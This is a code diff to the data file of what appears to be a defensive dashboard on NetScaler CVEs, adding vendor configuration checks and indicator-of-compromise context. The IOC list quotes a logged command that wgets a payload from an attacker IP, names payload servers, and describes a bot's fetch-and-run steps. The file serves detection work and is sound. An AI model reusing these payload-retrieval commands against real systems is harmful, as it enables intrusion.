@@ -88,6 +88,7 @@ var SOURCES = {
   sygnia:      { cat: 'research', label: 'Sygnia - Actively Exploited NetScaler Vulnerabilities (IR-based advisory, Sep 30)', url: 'https://www.sygnia.co/threat-reports-and-advisories/actively-exploited-netscaler-vulnerabilities/' },
   tenex:       { cat: 'research', label: 'TENEX - What TENEX Observed Inside Active Exploitation of CVE-2026-88771 (Sep 30)', url: 'https://tenex.ai/blog/what-tenex-observed-inside-active-exploitation-of-netscaler-zero-day/' },
   poppchecker: { cat: 'research', label: 'Poppelgaard - NetScaler CTX697096 checker (free read-only script; v1.9 Oct 1, v1.11 Oct 2)', url: 'https://github.com/ThomasPoppelgaard/netscaler-ctx697096-checker' },
+  poppel:      { cat: 'research', label: 'Poppelgaard - CVE-2026-88771 through CVE-2026-88778, what you should know and how to fix (Sep 28, last updated Oct 2)', url: 'https://www.poppelgaard.com/cve-2026-88771-through-cve-2026-88778-what-you-should-know-and-how-to-fix-your-netscaler-adc-netscaler-gateway' },
   levelblue:   { cat: 'research', label: 'LevelBlue SpiderLabs (THOR team) - CVE-2026-88771 Observed Exploitation Artifacts and Hunt Indicators (Sep 30; own findings, not independently confirmed)', url: 'https://www.levelblue.com/blogs/spiderlabs-blog/citrix-netscaler-cve-2026-88771-observed-exploitation-artifacts-and-hunt-indicators' },
 
   censys:      { cat: 'telemetry', label: 'Censys advisory - NetScaler exposure (42,735 hosts, Sep 28)', url: 'https://censys.com/advisory/cve-2026-10747-2/' },
@@ -148,39 +149,46 @@ var CVES = [
       ['Exposure', 'DTLS is ON by default on VPN virtual servers unless the admin sets -dtls OFF.', ['citrix']],
       ['Campaign (GTIG/Mandiant)', 'Exploited since at least early September. Exploitation crashes the NSPPE packet engine and gives root-level access. Organisations in North America and Europe in government, financial services, education and legal/professional services were likely impacted.', ['gtig']],
       ['Mechanics (watchTowr)', 'Preauth heap overflow in the DTLS stack (nsppe process); 137,825 bytes written past the buffer; control gained via an overwritten global list pointer, then a ROP chain calling mprotect and jumping to shellcode - full RCE, not just DoS.', ['wt2']],
-      ['Status', 'Exploited in the wild; in CISA KEV since Sep 27.', ['citrix', 'cisa']]
+      ['Status', 'Exploited in the wild; in CISA KEV since Sep 27.', ['citrix', 'cisa']],
+      ['Config check (Citrix)', 'Citrix: a Gateway is vulnerable unless DTLS is explicitly disabled. add vpn vserver vpn1 SSL 10.0.0.0 443 -Listenpolicy NONE means DTLS is on by default; the same line with -dtls OFF means it is off. add vpn vserver vs1 DTLS 10.11.1.1 443 and add lb vserver vd_dtls DTLS 10.146.111.74 443 mean DTLS is enabled.', ['citrix']]
     ] },
   { id: 'CVE-2026-88773', kind: 'chain', status: 'Chain component according to Beaumont', score: 'CVSS 4.0: 9.3 Critical',
     rows: [
       ['Type', 'HTTP request smuggling (CWE-444).', ['citrix', 'ncscnl']],
       ['Precondition', 'HTTP configuration enabled on NetScaler ADC or Gateway. No authentication or user interaction needed (NCSC-NL).', ['citrix', 'ncscnl']],
-      ['Role (Beaumont)', 'Used in a chain with CVE-2026-88771 and CVE-2026-88772 in the original attacks, according to Beaumont. Not independently confirmed; no source reports it exploited on its own.', ['kb1']]
+      ['Role (Beaumont)', 'Used in a chain with CVE-2026-88771 and CVE-2026-88772 in the original attacks, according to Beaumont. Not independently confirmed; no source reports it exploited on its own.', ['kb1']],
+      ['Config check (Citrix)', 'Citrix: met when load balancing, content switching, VPN or authentication virtual servers of type HTTP or SSL exist (add lb, cs, vpn or authentication vserver, followed by a name and HTTP or SSL).', ['citrix']]
     ] },
   { id: 'CVE-2026-88774', kind: 'other', status: 'No exploitation reported', score: 'CVSS 4.0: 7.0',
     rows: [
       ['Type', 'Feature policy bypass due to improper HTTP URL-based expression usage (CWE-16).', ['citrix', 'ncscnl']],
-      ['Precondition', 'Any policy expression configured with an HTTP URL-based expression.', ['citrix']]
+      ['Precondition', 'Any policy expression configured with an HTTP URL-based expression.', ['citrix']],
+      ['Config check (Citrix)', 'Citrix: the same virtual-server check as CVE-2026-88773 (HTTP or SSL virtual servers on LB, CS, VPN or authentication).', ['citrix']]
     ] },
   { id: 'CVE-2026-88775', kind: 'other', status: 'No exploitation reported', score: 'CVSS 4.0: 8.8',
     rows: [
       ['Type', 'Memory overflow leading to unpredictable behaviour or denial of service (CWE-119).', ['citrix', 'ncscnl']],
-      ['Precondition', 'Configured as a Gateway (SSL VPN, ICA Proxy, CVPN, RDP Proxy) or AAA virtual server.', ['citrix']]
+      ['Precondition', 'Configured as a Gateway (SSL VPN, ICA Proxy, CVPN, RDP Proxy) or AAA virtual server.', ['citrix']],
+      ['Config check (Citrix)', 'Citrix: look for configuration lines matching add vpn vserver .* (Gateway) or add authentication vserver .* (AAA).', ['citrix']]
     ] },
   { id: 'CVE-2026-88776', kind: 'other', status: 'No exploitation reported', score: 'CVSS 4.0: 8.8',
     rows: [
       ['Type', 'Memory overflow leading to unpredictable behaviour or denial of service (CWE-119).', ['citrix', 'ncscnl']],
-      ['Precondition', 'Load Balancing virtual server of type Oracle.', ['citrix']]
+      ['Precondition', 'Load Balancing virtual server of type Oracle.', ['citrix']],
+      ['Config check (Citrix)', 'Citrix: look for a configuration line matching add lb vserver.*ORACLE.*', ['citrix']]
     ] },
   { id: 'CVE-2026-88777', kind: 'other', status: 'No exploitation reported', score: 'CVSS 4.0: 8.8',
     rows: [
       ['Type', 'Memory overflow leading to unpredictable behaviour or denial of service (CWE-119).', ['citrix', 'ncscnl']],
-      ['Precondition', 'LB/CS or CGNAT-LSN/NAT64 device with a non-HTTP L7 protocol feature enabled.', ['citrix']]
+      ['Precondition', 'LB/CS or CGNAT-LSN/NAT64 device with a non-HTTP L7 protocol feature enabled.', ['citrix']],
+      ['Config check (Citrix)', 'Citrix gives case-insensitive configuration-text patterns (not CLI commands) to search in /nsconfig/ns.conf or show ns runningConfig: FTP over LB or CS (add (lb|cs) vserver .* FTP, add service .* FTP), FTP health monitors (add lb monitor .* FTP or FTP-EXTENDED), LSN groups (add lsn group .*; FTP ALG counts as enabled unless set lsn group .* -ftp DISABLED is present), RTSP (set lsn group .* -rtspalg ENABLED), DNS64 (add lb vserver .* DNS .* -dns64 ENABLED; add dns policy64 counts only if bound to a DNS virtual server) and NAT64 (add nat64).', ['citrix']]
     ] },
   { id: 'CVE-2026-88778', kind: 'other', status: 'No exploitation reported', score: 'CVSS 4.0: 8.8',
     rows: [
       ['Type', 'TCP Initial Sequence Number (ISN) prediction (CWE-342).', ['citrix', 'ncscnl']],
       ['Precondition', 'TCP configuration enabled. CIRCL gives a CLI check for disabled Enhanced ISN Generation.', ['citrix', 'circl']],
-      ['Fix', 'Closed by enabling Enhanced ISN Generation; the upgrade alone does not fix it.', ['citrix', 'wtfaq', 'certeuadv']]
+      ['Fix', 'Closed by enabling Enhanced ISN Generation; the upgrade alone does not fix it.', ['citrix', 'wtfaq', 'certeuadv']],
+      ['Config check (Citrix)', 'Citrix: both must be true. (1) At least one virtual server of type HTTP, SSL, SSL_BRIDGE, TCP, SSL_TCP, FTP, NNTP, RTSP, RDP, DNS_TCP, DOT, SIP_TCP, SIP_SSL, DIAMETER, SSL_DIAMETER, MYSQL, MSSQL, ORACLE, SMPP, MQTT, MQTT_TLS, MONGO, MONGO_TLS, PROXY, SSL_PROXY, USER_TCP or USER_SSL_TCP. (2) show ns tcpparam | grep "Enhanced ISN Generation" returns DISABLED.', ['citrix']]
     ] }
 ];
 
@@ -673,8 +681,8 @@ var IOCS = [
   { type: 'Log string', value: 'pitboss PPE unexpectedly died NSPPE;wget http://31.56.197.72:9090/lula;# X', context: 'Payload retrieval from 31.56.197.72, also described by LevelBlue; the same host appears in the Arctic Wolf and TENEX data', caveat: RD_CAVEAT + ' The wget line itself matches LevelBlue\'s published example.', cite: ['redditasm', 'levelblue'], share: RD_SHARE },
   { type: 'IPv4', value: '213.209.159.55', context: 'Payload server named in screenshots of a write-up attached to the Beaumont post (author not named): crafted SAML-factor usernames on two 14.1-73.37 appliances made them fetch a payload from it over plain HTTP on TCP 443 (paths under /t/), save it as /v and run it. The incoming request source was not identified. AS208137, Feo Prest SRL, Germany.', caveat: 'Unverified. The write-up itself says it shows exploitation attempts and correlated crashes, not confirmed command execution, a specific CVE or a firmware regression. No vendor or CERT has confirmed it. A hunting lead, not a blocklist entry.', cite: ['kb12'], share: 'Public Mastodon post (screenshots)' },
   { type: 'Domain', value: 'pyrlnk.cc', context: 'Edit in the same write-up: attackers moved to *.pyrlnk.cc as the attempted payload delivery source', caveat: 'Unverified; spelling read from the screenshot. A third-party checker release spells it pylrk.cc, so confirm against the original before blocking. Check DNS and proxy logs rather than relying on this one string.', cite: ['kb12'], share: 'Public Mastodon post (screenshots)' },
-  { type: 'File path', value: '/v', context: 'Payload file the injected commands save at the filesystem root and execute (same write-up)', caveat: 'Unverified. A missing /v does not rule out earlier execution or cleanup, as the write-up itself notes.', cite: ['kb12'], share: 'Public Mastodon post (screenshots)' },
-  { type: 'URI path', value: '/t/', context: 'Paths under /t/ on 213.209.159.55:443 (plain HTTP) used for the payload downloads', caveat: 'Unverified, single write-up. A short generic path, so only meaningful together with the IP.', cite: ['kb12'], share: 'Public Mastodon post (screenshots)' },
+  { type: 'File path', value: '/v', context: 'Payload file the injected commands save at the filesystem root and execute (same write-up) Poppelgaard separately describes a bot sending fetch -qo /v with an http URL on port 443 and then sh /v, using IFS instead of spaces.', caveat: 'Unverified. A missing /v does not rule out earlier execution or cleanup, as the write-up itself notes.', cite: ['kb12', 'poppel'], share: 'Public Mastodon post (screenshots)' },
+  { type: 'URI path', value: '/t/', context: 'Paths under /t/ on 213.209.159.55:443 (plain HTTP) used for the payload downloads Poppelgaard describes the same /t/<hex> download path from a bot.', caveat: 'Unverified, single write-up. A short generic path, so only meaningful together with the IP.', cite: ['kb12', 'poppel'], share: 'Public Mastodon post (screenshots)' },
   { type: 'File name', value: 'nsaaad-*.gz', context: 'Core dumps of the authentication daemon in recently modified numbered directories under /var/core after repeated crashes (exit status 0x8a, restart limit 6, then a reboot)', caveat: 'Unverified. Crashes have other causes; a match is a reason to preserve logs and cores and involve Citrix Support, not proof of compromise.', cite: ['kb12'], share: 'Public Mastodon post (screenshots)' },
   { type: 'Config pattern', value: 'add authentication samlAction.*', context: 'Citrix: an appliance with this line (NetScaler as SAML service provider) on a Gateway or AAA virtual server is affected by the new SAML issue', caveat: 'Applicability check from Citrix, not an indicator of compromise.', cite: ['citrixsaml'], share: 'Public vendor blog, no TLP marking' },
   { type: 'Config pattern', value: 'add authentication samlIdPProfile.*', context: 'Citrix: an appliance with this line (NetScaler as SAML identity provider) is affected by the new SAML issue', caveat: 'Applicability check from Citrix, not an indicator of compromise.', cite: ['citrixsaml'], share: 'Public vendor blog, no TLP marking' },
